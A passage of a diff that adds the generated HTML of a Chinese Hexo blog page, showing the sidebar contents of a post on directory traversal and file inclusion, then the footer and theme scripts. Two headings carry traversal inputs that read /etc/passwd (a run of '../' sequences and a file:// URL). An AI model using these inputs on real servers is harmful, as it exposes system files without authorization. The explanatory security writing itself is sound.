class="nav-link" href="#4-%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E8%BF%87%E6%BB%A4%EF%BC%9B"><span class="nav-number">1.1.4.</span> <span class="nav-text">(4) 绕过文件后缀过滤；</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E7%BB%95%E8%BF%87%E6%9D%A5%E8%B7%AF%E9%AA%8C%E8%AF%81%E3%80%82"><span class="nav-number">1.1.5.</span> <span class="nav-text">(5) 绕过来路验证。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E8%8C%83%E9%81%8D%E5%8E%86%E8%B7%AF%E5%BE%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">防范遍历路径漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%98%E6%9C%89%E4%B8%80%E7%A7%8D%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E9%82%A3%E5%B0%B1%E6%98%AF%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AAweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84"><span class="nav-number">1.4.</span> <span class="nav-text">还有一种目录遍历 那就是因为这个web服务器的配置不当造成的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="nav-number">1.5.</span> <span class="nav-text">目录遍历漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">1.5.1.</span> <span class="nav-text">漏洞利用示例：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%89%B9%E5%BE%81%E8%A6%81%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="nav-number">1.5.2.</span> <span class="nav-text">目录遍历漏洞的特征要注意：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">1.5.3.</span> <span class="nav-text">常用漏洞验证方式：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%BC%9A-%EF%BC%88%E5%A4%9A%E5%B0%91%E4%B8%AA-%E9%83%BD%E8%A1%8C%EF%BC%8C%E8%B6%8A%E5%A4%9A%E8%B6%8A%E5%A5%BD%EF%BC%89-etc-passwd"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">1：..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;（多少个..&#x2F;都行，越多越好）&#x2F;etc&#x2F;passwd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-file-etc-passwd%EF%BC%88%E8%BF%99%E9%87%8C%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%80%E8%87%B4%EF%BC%89"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">2.file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd（这里是文件包含漏洞，不过利用方法一致）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-http-xxxxx"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">3.http:&#x2F;&#x2F;xxxxx</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%EF%BC%9A"><span class="nav-number">1.5.4.</span> <span class="nav-text">注意事项：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">1.5.5.</span> <span class="nav-text">远程文件包含示例：</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">magic</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/blog.github.io/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/blog.github.io/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/blog.github.io/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/blog.github.io/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/blog.github.io/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/blog.github.io/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/blog.github.io/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/blog.github.io/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
